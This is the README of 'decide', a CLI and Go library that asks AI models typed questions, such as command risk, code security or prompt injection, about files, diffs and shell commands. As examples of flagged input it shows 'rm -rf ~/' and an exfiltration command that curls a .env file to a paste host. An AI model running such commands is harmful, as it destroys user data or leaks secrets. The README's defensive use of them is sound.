# decide

[![Reference](https://img.shields.io/badge/reference-pkg.go.dev-00ADD8?style=flat-square&logo=go&logoColor=white&labelColor=2f363d)](https://pkg.go.dev/github.com/deepnoodle-ai/decide)
[![Tests](https://img.shields.io/github/actions/workflow/status/deepnoodle-ai/decide/ci.yml?branch=main&style=flat-square&label=tests&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/deepnoodle-ai/decide?style=flat-square&label=release&labelColor=2f363d&color=00ADD8)](https://github.com/deepnoodle-ai/decide/releases)

**Ask a question about every file, ticket, diff, or line. Get back yes
or no, a choice, or a score, each with a probability. No essay.**

```sh
brew install deepnoodle-ai/tap/decide
export TYPESAFE_API_KEY=...

echo 'rm -rf ~/' | decide run command-risk
```

```
Running command-risk on 1 line · typesafe jev-latest

stdin:1  rm -rf ~/
! destructive  yes     98%
  leak         no      89%
  publish      no      74%
! severe       yes     98%

✓ 1 answered  ! 1 flagged  200ms
Flagged: stdin:1
```

That's it. One command in, typed answers out, each with a number a
script can act on. Put it in a git hook, a CI job, or an agent's loop.

[![decide passes ls -la src, flags git push --force origin main as destructive, and flags curl -d @.env paste.example.com as a leak](https://files.deepnoodle.ai/decide/site/landing-8048b29e5adf.gif)](https://decide.deepnoodle.ai)

**Docs: [decide.deepnoodle.ai](https://decide.deepnoodle.ai)**. Start
with the [quickstart](https://decide.deepnoodle.ai/start/), then the
[tutorials](https://decide.deepnoodle.ai/tutorials/check-agent-commands/)
and [recipes](https://decide.deepnoodle.ai/recipes/). Agents can read the
[agent guide](https://decide.deepnoodle.ai/reference/agents/).

## Point it at anything

```sh
git diff | decide run code-risk                      # each changed file
git diff | decide run code-risk --each function      # each changed function
decide run security src                              # injection, SSRF, XSS, weak crypto
decide run relevance docs -p question="pricing"      # which docs mention pricing?
gh issue list --json number,title,body | decide run task-readiness
gh pr view 42 --json number,title,body | decide run pr-description --fail-on flagged
decide run receipt-quality receipt.jpg --provider openai
```

decide reads text, Markdown, source code, diffs, JSON, JSONL, CSV,
images, audio, video, and PDFs. It splits them into items, asks about
each one, and flags the answers that need a look.

- `--fail-on flagged` exits with code 2 when anything is flagged, so CI
  can stop.
- `decide runs view` shows the last run again, as text, JSON, CSV, or a
  Markdown report.
- A second run asks only about what changed. Answers are cached in
  `~/.decide/cache`.

## Twelve questions, built in

| Template | Asks |
| --- | --- |
| `sentiment` | Positive, negative, or neutral? |
| `triage` | Is this support request urgent? How bad is the impact? |
| `ticket-routing` | Billing, engineering, or other? |
| `relevance` | Does this answer a question you choose? |
| `code-risk` | Could this code cause security or data problems? |
| `security` | Can untrusted input reach a query, a command, a URL, or a page? |
| `prompt-injection` | Is this text trying to hijack an AI agent? |
| `task-readiness` | Is this issue ready for a coding agent? How big is it? |
| `pr-description` | Does this pull request's description meet your guidelines? |
| `command-risk` | Could this shell command destroy work or leak secrets? |
| `receipt-quality` | Is this a readable receipt? (image) |
| `invoice-check` | Is this a complete, paid invoice? (PDF, Gemini only) |

Need a different question? `decide templates new NAME --from TEMPLATE`
copies one to edit. A template is a few lines of JSON. See
[templates](https://decide.deepnoodle.ai/reference/templates/).

Want to see the templates catch something? The [demo](demo/README.md) is
a small repository with planted problems.

## Pick a model

Jev is the default. Switch with `--provider` or `DECIDE_PROVIDER`, and
nothing else changes.

| Provider | Model | Set | Reads |
| --- | --- | --- | --- |
| [Jev](https://docs.typesafe.ai/introduction) by TypeSafe | `jev-latest` | `TYPESAFE_API_KEY` | text |
| [Clef](https://developers.cloudflare.com/workers-ai/models/clef/) by Cloudflare | `clef`, `clef-flash` | `CLOUDFLARE_AUTH_TOKEN`, `CLOUDFLARE_ACCOUNT_ID`, `--provider cloudflare` | text, images |
| [GPT-6 Luna](https://developers.openai.com/api/docs/guides/decisions) by OpenAI | `gpt-6-luna` | `OPENAI_API_KEY`, `--provider openai` | text, images |
| [Gemini Decision](https://aistudio.google.com/docs/decisions-api) by Google | `gemini-decision-1` | `GEMINI_API_KEY`, `--provider gemini` | text, images, audio, video, PDFs |

Hosting a Jev-compatible service yourself? Set `TYPESAFE_BASE_URL` and
pass `--model`. The [providers page](https://decide.deepnoodle.ai/reference/providers/)
has file formats and size limits.

## From Go

```sh
go get github.com/deepnoodle-ai/decide
```

```go
client, err := decide.NewClient() // reads TYPESAFE_API_KEY
if err != nil {
	return err
}
e, err := decide.Eval(ctx, client, ticket, decide.Noul("Is this about billing?"))
if err != nil {
	return err
}
fmt.Println(e.Answer.Noul) // probability of yes, such as 0.97
```

Three lines to a probability. From there, the
[`templates`](templates) package gives you the built-in questions, the
[`patterns`](patterns) packages build gates, rankings, and funnels from
answers, and [`decidetest`](decidetest) fakes the server in tests. Other
providers use `backend.NewClient`. The [Go guide](https://decide.deepnoodle.ai/start/go/)
walks through a first program, and the
[reference](https://pkg.go.dev/github.com/deepnoodle-ai/decide) has the
rest.

## From Claude Code

```text
/plugin marketplace add deepnoodle-ai/decide
/plugin install decide@decide
```

The plugin gives Claude a second opinion: it checks outside content
before Claude acts on it, checks each shell command in bypass mode, and
adds a judge tool and the `/decide:audit` and `/decide:hunt` skills. See
the [Claude Code guide](https://decide.deepnoodle.ai/reference/claude-code/)
and [plugin/README.md](plugin/README.md).

## Install

```sh
brew install deepnoodle-ai/tap/decide
```

Or `go install github.com/deepnoodle-ai/decide/cmd/decide@latest`, or
grab a binary from the [releases](https://github.com/deepnoodle-ai/decide/releases).
Run `decide` on its own for a tour.

## Status

decide is young. Before v1, the library API and the CLI may change in
any release.

## Contributing

Issues and pull requests are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md)
first, and report security issues as described in [SECURITY.md](SECURITY.md).

## License

[Apache 2.0](LICENSE)
